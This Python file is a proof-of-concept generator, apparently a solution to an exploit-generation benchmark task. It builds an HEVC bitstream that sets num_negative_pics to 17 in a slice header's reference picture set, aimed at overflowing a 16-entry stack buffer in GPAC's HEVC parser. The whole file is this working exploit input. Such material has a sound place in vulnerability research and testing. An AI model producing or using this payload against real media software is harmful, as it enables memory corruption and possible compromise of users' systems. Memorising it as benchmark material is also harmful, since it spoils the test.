import math

class Solution:
    """
    Generates a Proof-of-Concept for a Stack Buffer Overflow in GPAC's HEVC parser.
    """

    class _BitWriter:
        """A helper class to write bitstreams."""
        def __init__(self):
            self.data = bytearray()
            self.current_byte = 0
            self.bit_pos = 0

        def write_bit(self, bit: int):
            if bit:
                self.current_byte |= (1 << (7 - self.bit_pos))
            self.bit_pos += 1
            if self.bit_pos == 8:
                self.data.append(self.current_byte)
                self.current_byte = 0
                self.bit_pos = 0

        def write_bits(self, value: int, n: int):
            for i in range(n):
                bit = (value >> (n - 1 - i)) & 1
                self.write_bit(bit)
        
        def write_ue(self, value: int):
            """Writes an unsigned Exp-Golomb coded number."""
            if value < 0:
                raise ValueError("Cannot write negative value with ue(v)")
            if value == 0:
                self.write_bit(1)
                return
            
            temp = value + 1
            num_bits = int(math.log2(temp)) + 1
            leading_zeros = num_bits - 1
            
            self.write_bits(0, leading_zeros)
            self.write_bits(temp, num_bits)

        def write_se(self, value: int):
            """Writes a signed Exp-Golomb coded number."""
            if value <= 0:
                code_num = -2 * value
            else:
                code_num = 2 * value - 1
            self.write_ue(code_num)

        def flush(self) -> bytes:
            """Flushes any remaining bits and returns the byte data."""
            if self.bit_pos > 0:
                self.data.append(self.current_byte)
            return bytes(self.data)

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        start_code = b'\x00\x00\x00\x01'
        
        # Minimal NAL units (VPS, SPS, PPS) for a valid HEVC stream structure.
        # These are hardcoded from a known-good minimal 32x32 HEVC stream.
        nal_vps = start_code + b'\x40\x01\x0c\x01\xff\xff\x01\x60\x00\x00\x03\x00\x00\x03\x00\x00\x03\x00\x00\xac\x08'
        nal_sps = start_code + b'\x42\x01\x01\x01\x60\x00\x00\x03\x00\x00\x03\x00\x00\x03\x00\x00\xac\xa0\x02\x80\x80\x2d\x16\x59\x59\xa4\x93\x24\xca\x00\x00\x03\x00\x02\x00\x00\x03\x00\x3c\x20'
        nal_pps = start_code + b'\x44\x01\xc0\xf1\x80\x05\x10'

        writer = self._BitWriter()

        # Craft a malicious Slice Header (NAL Type 1, TRAIL_R)
        # The vulnerability is triggered by a large num_negative_pics in the
        # short_term_ref_pic_set (RPS) structure within the slice header.
        # The vulnerable code uses a fixed-size stack buffer of 16.
        
        writer.write_bit(1)           # first_slice_segment_in_pic_flag
        writer.write_ue(0)            # slice_pic_parameter_set_id
        writer.write_ue(1)            # slice_type = P_SLICE
        writer.write_bits(1, 8)       # slice_pic_order_cnt_lsb
        
        # Define RPS in the slice header
        writer.write_bit(0)           # short_term_ref_pic_set_sps_flag

        # short_term_ref_pic_set() structure
        writer.write_bit(0)           # inter_ref_pic_set_prediction_flag
        writer.write_ue(17)           # num_negative_pics (TRIGGER > 16)
        writer.write_ue(0)            # num_positive_pics
        
        # Populate the RPS lists according to the counts above
        for _ in range(17):
            writer.write_ue(0)        # delta_poc_s0_minus1
            writer.write_bit(1)       # used_by_curr_pic_s0_flag

        # Fill in remaining mandatory slice header fields with minimal values
        writer.write_ue(0)            # num_ref_idx_l0_active_minus1
        writer.write_bit(0)           # ref_pic_list_modification_flag_l0
        writer.write_ue(0)            # five_minus_max_num_merge_cand
        writer.write_se(0)            # slice_qp_delta
        
        # End of RBSP data
        writer.write_bit(1)           # rbsp_stop_one_bit
        
        slice_payload = writer.flush()
        nal_slice = start_code + b'\x02\x01' + slice_payload
        
        # Combine all NAL units to form the final PoC bitstream
        return nal_vps + nal_sps + nal_pps + nal_slice